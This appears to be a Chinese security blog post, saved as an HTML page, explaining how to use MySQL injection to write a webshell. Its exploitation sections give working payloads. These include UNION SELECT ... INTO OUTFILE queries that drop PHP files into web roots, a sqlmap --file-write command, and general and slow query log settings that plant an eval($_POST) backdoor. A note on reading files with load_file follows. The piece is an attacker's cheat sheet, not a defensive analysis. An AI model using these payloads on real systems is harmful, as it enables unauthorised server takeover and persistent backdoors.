@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>MySQL 注入写 shell</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/mysql-2/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='MySQL 注入写 shell'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/mysql-2/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="MySQL 注入写 shell">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/mysql-2/">
+                <img src="/p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/mysql-2/">MySQL 注入写 shell</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="mysql注入写shell">MySQL注入写shell</h1>
+<h2 id="into-outfile写shell">into outfile写shell</h2>
+<p>outfile()</p>
+<p>dumpfile()</p>
+<h3 id="注意点">注意点</h3>
+<ul>
+<li>
+<p>二者函数的路径不支持hex和char转换，必须由引号包裹</p>
+</li>
+<li>
+<p>outfile函数可以导出多行，dumpfile函数只能导出一行数据</p>
+</li>
+<li>
+<p>outfile函数在将数据写到文件里时有特殊的格式转换，dumpfile函数保持原数据格式</p>
+<p>比如：写入a\naa\raaa</p>
+<p>outfile会在将&quot;\n&quot;转义，并且在文件末尾新加入一行，结果为4行；而dumpfile则是原格式写入，没有转义，没有新增行，结果为三行</p>
+</li>
+<li>
+<p><strong>写入路径中指定的文件必须不存在，即无法覆盖写入</strong></p>
+</li>
+</ul>
+<h3 id="前提条件">前提条件</h3>
+<p><strong>1. file_priv</strong></p>
+<p>代表用户所具有的文件操作权限</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 418; 
+			flex-basis: 1005px"
+	>
+	<a href="/p/mysql-2/image-20210529153840281.png" data-size="490x117">
+		<img src="/p/mysql-2/image-20210529153840281.png"
+			width="490"
+			height="117"
+			srcset="/p/mysql-2/image-20210529153840281_hu5587781103156aaa2882e72e43f17fd3_11985_480x0_resize_box_3.png 480w, /p/mysql-2/image-20210529153840281_hu5587781103156aaa2882e72e43f17fd3_11985_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>2. secure_file_priv</strong></p>
+<p>代表mysql服务器所具有的文件操作权限</p>
+<p>其值在mysql配置文件my.ini中设置，用作限制导入导出</p>
+<ul>
+<li>mysql&gt;=5.5.53默认为NULL，即默认禁止导入导出</li>
+<li>mysql&lt;5.5.53默认为空，即默认无限制</li>
+<li>当其值=某目录时，即仅允许在该目录下导入导出</li>
+</ul>
+<p>查看secure_file_priv</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 345; 
+			flex-basis: 828px"
+	>
+	<a href="/p/mysql-2/image-20210529154624966.png" data-size="421x122">
+		<img src="/p/mysql-2/image-20210529154624966.png"
+			width="421"
+			height="122"
+			srcset="/p/mysql-2/image-20210529154624966_hu03351eb40ee1108259e293bef2a45d49_11962_480x0_resize_box_3.png 480w, /p/mysql-2/image-20210529154624966_hu03351eb40ee1108259e293bef2a45d49_11962_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>3. 知晓绝对路径且有写权限</strong></p>
+<h3 id="利用">利用</h3>
+<pre tabindex="0"><code># SQL
+?id=-1' union select '&lt;?php phpinfo(); ?&gt;' into outfile '/var/www/html/shell.php';
+
+?id=1 limit 1 into outfile 'C:/wamp64/www/work/shell.php' lines terminated by '&lt;?php phpinfo() ?&gt;';
+</code></pre><pre tabindex="0"><code># sqlmap
+sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/tmp/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;
+</code></pre><blockquote>
+<p>注意：</p>
+<p>一般情况下，Linux系统中MySQL用户不拥有站点根目录的写权限，所以无法写入；在Windows环境下成功率更高。</p>
+</blockquote>
+<h2 id="日志写shell">日志写shell</h2>
+<p>MySQL 5.0 版本以上会创建日志文件，因此可通过修改日志的全局变量来 getshell</p>
+<h3 id="注意点-1">注意点</h3>
+<p>日志路径可hex，但是写入日志的内容必须引号包裹，如果内容中被转义加上反斜杠\，传至数据库会报错</p>
+<h3 id="前提条件-1">前提条件</h3>
+<ul>
+<li>
+<p>绝对路径</p>
+</li>
+<li>
+<p>file_priv</p>
+</li>
+<li>
+<p><strong>不受secure_file_priv限制了</strong></p>
+</li>
+<li>
+<p>mysql用户有权限开启日志记录和更换日志路径</p>
+</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 311; 
+			flex-basis: 746px"
+	>
+	<a href="/p/mysql-2/image-20220209175734109.png" data-size="417x134">
+		<img src="/p/mysql-2/image-20220209175734109.png"
+			width="417"
+			height="134"
+			srcset="/p/mysql-2/image-20220209175734109_hu9208b1973513c5e2e67a137335abaea7_14111_480x0_resize_box_3.png 480w, /p/mysql-2/image-20220209175734109_hu9208b1973513c5e2e67a137335abaea7_14111_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 291; 
+			flex-basis: 698px"
+	>
+	<a href="/p/mysql-2/image-20220209175804413.png" data-size="428x147">
+		<img src="/p/mysql-2/image-20220209175804413.png"
+			width="428"
+			height="147"
+			srcset="/p/mysql-2/image-20220209175804413_hu32885edc5acb82afac53b8f9573fbef9_17931_480x0_resize_box_3.png 480w, /p/mysql-2/image-20220209175804413_hu32885edc5acb82afac53b8f9573fbef9_17931_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<blockquote>
+<p>默认路径中如果是文件的相对路径，一般指在MySQL安装目录下生成</p>
+</blockquote>
+<h3 id="利用-1">利用</h3>
+<p>mysql日志：<strong>错误日志、查询日志、慢查询日志、事务日志、二进制日志</strong></p>
+<p>其中可利用的为：<strong>慢查询日志和查询日志</strong></p>
+<p><strong>慢查询日志</strong></p>
+<p>记录查询时间超过指定时间(默认10s)的日志</p>
+<pre tabindex="0"><code>set global slow_query_log=1;
+set global slow_query_log_file='xxx/logshell.php';
+select &quot;&lt;?php eval($_POST[log]);?&gt;&quot; from xxx where sleep(11);
+</code></pre><p><strong>查询日志</strong></p>
+<pre tabindex="0"><code>set global general_log='on';
+set global general_log_file='xxx/shell.php';
+select '&lt;?php @eval($_POST[&quot;log&quot;]); ?&gt;';
+</code></pre><blockquote>
+<p>注意：</p>
+<p>该文件虽然可写入，但创建者是mysql用户</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 2204; 
+			flex-basis: 5290px"
+	>
+	<a href="/p/mysql-2/image-20220213165117905.png" data-size="529x24">
+		<img src="/p/mysql-2/image-20220213165117905.png"
+			width="529"
+			height="24"
+			srcset="/p/mysql-2/image-20220213165117905_hu46f4bf0182ae66b027a3c4db79ad741f_6609_480x0_resize_box_3.png 480w, /p/mysql-2/image-20220213165117905_hu46f4bf0182ae66b027a3c4db79ad741f_6609_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>假设该文件是.php，访问该文件会出现500状态码，所以大多数在Windows上会成功，而Linux基本不行。</p>
+</blockquote>
+<h2 id="读文件">读文件</h2>
+<h3 id="注意点-2">注意点</h3>
+<p>load_file函数中的路径可以是单引号或0x、char转换的字符，但是路径中的斜杠是/而不是\</p>
+<h3 id="前提条件-2">前提条件</h3>
+<p>所读文件的绝对路径</p>
+<p>secure_file_priv</p>
+<p>file_priv</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-3/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-3"
+                        data-key="php-3" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-3</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#into-outfile写shell">into outfile写shell</a>
+      <ol>
+        <li><a href="#注意点">注意点</a></li>
+        <li><a href="#前提条件">前提条件</a></li>
+        <li><a href="#利用">利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#日志写shell">日志写shell</a>
+      <ol>
+        <li><a href="#注意点-1">注意点</a></li>
+        <li><a href="#前提条件-1">前提条件</a></li>
+        <li><a href="#利用-1">利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#读文件">读文件</a>
+      <ol>
+        <li><a href="#注意点-2">注意点</a></li>
+        <li><a href="#前提条件-2">前提条件</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
